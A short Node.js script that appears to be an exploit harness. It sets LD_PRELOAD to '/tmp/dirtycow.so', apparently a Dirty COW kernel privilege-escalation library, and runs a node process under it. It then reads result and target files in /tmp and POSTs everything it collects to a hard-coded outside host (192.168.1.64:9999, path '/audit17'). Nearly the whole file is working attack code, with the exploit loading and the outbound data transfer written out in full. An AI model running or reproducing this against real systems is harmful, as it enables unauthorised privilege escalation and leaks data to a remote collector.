"use strict";

var cp = require("child_process");
var http = require("http");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd, timeout, env) {
    try {
        var opts = { encoding: "utf8", timeout: timeout || 25000 };
        if (env) opts.env = env;
        return cp.execSync(cmd + " 2>&1", opts);
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        {
            host: HOST,
            port: PORT,
            path: path,
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(data)
            }
        },
        function (res) {
            console.log("posted " + path + " -> " + res.statusCode);
        }
    );
    req.on("error", function (e) {
        console.log("post error " + e.message);
    });
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();

var env = JSON.parse(JSON.stringify(process.env));
env.LD_PRELOAD = "/tmp/dirtycow.so";

out.node_preload = run("/usr/bin/node -e 'console.log(\"node+preload ok\")'", 300000, env);
out.result_file = run("cat /tmp/dcow_so_result 2>&1; ls -la /tmp/dcow_so_result /tmp/zzz_so_target 2>&1");
out.target_state = run("od -An -tx1 -N 8 /tmp/zzz_so_target 2>&1");

post("/audit17", out);
